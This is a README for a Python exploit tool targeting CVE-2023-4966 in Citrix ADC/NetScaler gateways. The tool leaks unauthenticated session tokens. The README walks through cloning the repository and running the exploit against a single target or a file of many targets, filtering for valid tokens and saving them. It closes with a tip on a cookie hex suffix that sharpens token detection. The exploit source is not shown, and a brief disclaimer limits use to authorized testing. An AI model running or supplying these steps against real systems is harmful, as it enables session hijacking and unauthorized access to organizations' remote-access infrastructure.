# CVE-2023-4966 Citrix Memory Leak Exploit 🔒

Leak session tokens from vulnerable Citrix ADC instances affected by CVE-2023-4966. ⚠️

## Description 📃

This Python script exploits CVE-2023-4966, a critical vulnerability in Citrix ADC instances that allows unauthenticated attackers to leak session tokens. The vulnerability is assigned a CVSS score of 9.4 and is remotely exploitable without user interaction. Citrix NetScaler appliances configured as Gateways (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or AAA virtual servers are vulnerable to this attack. :skull_and_crossbones:

## Usage 💻

```bash
$ OPENSSL_CONF=./openssl.cnf python3.10 exploit.py -h
```

Options:
- `-h, --help`: Show the help message and exit. ℹ️
- `-u URL, --url URL`: Specify the Citrix ADC / Gateway target (e.g., https://192.168.1.200). 🔗
- `-f FILE, --file FILE`: Provide a file containing a list of target URLs (one URL per line). 📁
- `-o OUTPUT, --output OUTPUT`: Specify the file to save the output results. 💾
- `-v, --verbose`: Enable verbose mode. 🔊
- `--only-valid`: Only show results with valid session tokens.

## How to Use 💡

1. Clone the repository:
   ```bash
   $ git clone https://github.com/Chocapikk/CVE-2023-4966.git
   $ cd CVE-2023-4966
   ```

2. Run the exploit:

   For a single target:
   ```bash
   $ OPENSSL_CONF=./openssl.cnf python3.10 exploit.py -u https://target.example.com
   ```

   For multiple targets listed in a file:
   ```bash
   $ OPENSSL_CONF=./openssl.cnf python3.10 exploit.py -f targets.txt --only-valid
   ```

   Use the `-o` flag to specify an output file for the results:

   ```bash
   $ OPENSSL_CONF=./openssl.cnf python3.10 exploit.py -u https://target.example.com -o results.txt --only-valid
   ```

   To enable verbose mode, use the `-v` flag. 🔊

## Credits 👏

This exploit is inspired by the research conducted by [Assetnote](https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966). 🙌

## Disclaimer ⚠️

This script is provided for educational and research purposes only. Use it responsibly and only on systems you have permission to test. 🛡️

---

## Note 📝

During my research, I found that the session cookies always end with the hex sequence `45525d5f4f58455e445a4a42`. Incorporating this information can greatly enhance the accuracy of session token detection.